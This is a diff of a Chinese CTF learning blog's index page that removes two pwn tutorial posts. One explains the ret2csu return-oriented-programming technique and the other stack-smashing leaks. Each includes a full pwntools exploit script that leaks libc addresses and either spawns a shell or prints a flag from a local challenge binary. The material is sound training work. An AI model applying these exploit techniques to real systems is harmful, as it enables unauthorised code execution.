     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/25/windows礼包/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1767,402 +2168,11 @@ r.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/pwn学习（9）中级ROP（一）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/26/pwn学习（9）中级ROP（一）/" itemprop="url">pwn学习（9）中级ROP（一）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-26T21:16:45+08:00">
-                2018-11-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>周六周末简单复习了一下计算机网络的前三章，稍微撇了几眼数据结构，甚至还试着拿angr去做了做某个比赛的逆向题。。。想想自己还有四级需要准备就有点头疼，不过pwn还是得学啊，中级ROP大概会写两次博客吧</p>
-<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>不知道大家有没有和我一样的经历，拿到一个64程序，看上去漏洞很明显然后就开始想着拿payload覆盖数据，泄漏libc然后重复调用漏洞函数……怎么说呢，思路倒是没什么错，但是忽视了很重要的问题——64位程序传递参数的方式是优先使用寄存器的（准确的说是前6个参数），多出来的才用栈传递，这就限制了我们不能再简单的去用覆盖数据的方式实现函数的调用了。当然，我们还是可以使用gadgets来凑出来的，但是往往没有是那么合适的，这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<br>为什么呢？下面就来看一看</p>
-<blockquote>
-<p>一下内容来自某英文网站<a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxlugqem5tj313u0u0q82.jpg" alt=""><br>图片为32位，作为参考<br>从上图我们可以看到，当运行程序的时候，首先shell会使用 execve() 函数来出发系统调用。这时候系统会为我们的程序分配栈区并将argc、argv、envp压栈，按照shell设定fd，装载器还要进行重定位和调用预初始化器（preinitializers），然后就从_start来执行代码了。<br>利用ida（当然gdb、objdump上面的也一样）来看一下这段代码，重要的部分我都标记了注释<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxlvqgdsruj30ku09ewg8.jpg" alt=""><br>一点一点来看，首先xor了ebp也就是将ebp置为了0，然后紧接着就是pop，也就是将我们的栈顶的值拿了出来，根据之前的execve的压栈方式我们可以知道也就是argc，当我们pop后栈顶就成了argv，一个mov也就让我们成功拿到了，这么说大家也应该明白了，其实之后的几句都是在准备参数。<br>细致分析下来一共有7个参数，前六个按照x64的准则由rsi、rdi、rdx、rcx、r8、r9来传递，第七个则是利用栈来传递的，其中比较重要的参数应该是main的地址，argc、argv以及__libc_csu_init、__libc_csu_fini<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmp1fev7qj31eu0i8dpr.jpg" alt=""><br>如图所示即调用__libc_start_main时寄存器的情况<br>至于__libc_start_main函数做了什么呢？首先设置了uid和gid，然后启动线程，寄存fini和rtld_fini的参数，调用__libc_csu_init，调用main，调用exit。<br>这里就看到了我们调用程序几乎必然要用到这个函数，所以我们可以利用它来传递寄存器的值</p>
-</blockquote>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目是jarvis oj上的level5，首先还是file+checksec+ida<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxls5e0fvrj30iw064t9g.jpg" alt=""><br>漏洞很明显，但程序本身没有system和/bin/sh字符串，所以还是考虑用泄漏libc地址的方式来做。<br>因为程序用过了write函数我们就考虑泄漏它的地址，利用libc_csu_gadgets实现，并且再次跳转回主函数<br>计算出libc的地址，进而拿到execve的地址和/bin/sh字符串的地址<br>再次利用libc_csu_gadgets来将这两个地址写入到bss段，然后执行就好了<br>官方的exp如下<br>    from pwn import *</p>
-<pre><code>#context.log_level = &apos;debug&apos;
-
-level5 = ELF(&apos;./level5.dms&apos;)
-sh = process(&apos;./level5.dms&apos;)
-libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
-write_got = level5.got[&apos;write&apos;]
-read_got = level5.got[&apos;read&apos;]
-main_addr = level5.symbols[&apos;main&apos;]
-bss_base = level5.bss()
-csu_front_addr = 0x0000000000400600
-csu_end_addr = 0x000000000040061A
-fakeebp = &apos;b&apos; * 8
-
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = &apos;a&apos; * 0x80 + fakeebp
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += &apos;a&apos; * 0x38
-    payload += p64(last)
-    sh.send(payload)
-    sleep(1)
-
-
-sh.recvuntil(&apos;Hello, World\n&apos;)
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(sh.recv(8))
-libc_base = write_addr - libc.symbols[&apos;write&apos;]
-execve_addr = libc_base + libc.symbols[&apos;execve&apos;]
-log.success(&apos;execve_addr &apos; + hex(execve_addr))
-##gdb.attach(sh)
-
-## read(0,bss_base,16)
-## read execve_addr and /bin/sh\x00
-sh.recvuntil(&apos;Hello, World\n&apos;)
-csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + &apos;/bin/sh\x00&apos;)
-
-sh.recvuntil(&apos;Hello, World\n&apos;)
-## execve(bss_base+8)
-gdb.attach(sh)
-csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
-sh.interactive()
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/23/pwn学习（8）smashes练习及回顾/" itemprop="url">pwn学习（8）smashes练习及一周总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T20:27:19+08:00">
-                2018-11-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。</p>
-<h1 id="stack-smashes练习"><a href="#stack-smashes练习" class="headerlink" title="stack smashes练习"></a>stack smashes练习</h1><p>题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg" alt=""><br>首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。</p>
-<p>看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxiayuqsnmj313001ojsj.jpg" alt=""></p>
-<p>拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxib12tuidj30mw02iq3m.jpg" alt=""><br>明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。</p>
-<p>程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。</p>
-<p>那就说明我们要分三步走：</p>
-<ul>
-<li>利用smashes获取libc中的函数，比如puts</li>
-<li>利用smashes获取environ</li>
-<li>利用smashes获取flag</li>
-</ul>
-<p>那就来看看exp吧</p>
-<pre><code>from pwn import *
-arg0_addr = 0x7fffffffdf68
-input_addr = 0x7fffffffde40
-#context.log_level = &apos;debug&apos;
-p = process(&apos;./GUESS.dms&apos;)
-elf = ELF(&apos;./GUESS.dms&apos;)
-e = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
-
-flag_addr = 0x7fffffffde10
-puts_addr = 0x602020
-p.recvuntil(&apos;flag&apos;)
-payload = (arg0_addr - input_addr)*&apos;a&apos; +p64(puts_addr)
-p.sendline(payload)
-p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
-puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))
-log.info(hex(puts_addr))
-
-libc = puts_addr - e.symbols[&apos;puts&apos;]
-environ_addr = libc + e.symbols[&apos;__environ&apos;]
-log.info(hex(libc))
-
-p.recvuntil(&apos;flag&apos;)
-p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(environ_addr))
-p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
-stack = u64(p.recv(6).ljust(8, &apos;\x00&apos;))
-log.info(hex(stack))
-
-flag_addr = stack - 0x168
-
-p.recvuntil(&apos;flag&apos;)
-p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(flag_addr))
-
-p.interactive()
-</code></pre><p>各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.</p>
-<h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><p>这一周主要是学习了基础的ROP和花式溢出，另外还有一些格式化字符串漏洞的相关知识，当然除此之外还有一些pwntools的使用技巧和peda的调试技巧，也不知道这样的速度合不合适，但自己感觉需要好好总结回顾一下了，之后会利用周六把这周的东西重新捋一遍，看看还有没有什么新的发现或者是遗漏。</p>
-<p>sucessful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2208,7 +2218,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2230,7 +2240,7 @@ p.interactive()
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
@@ -2267,7 +2277,7 @@ p.interactive()
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
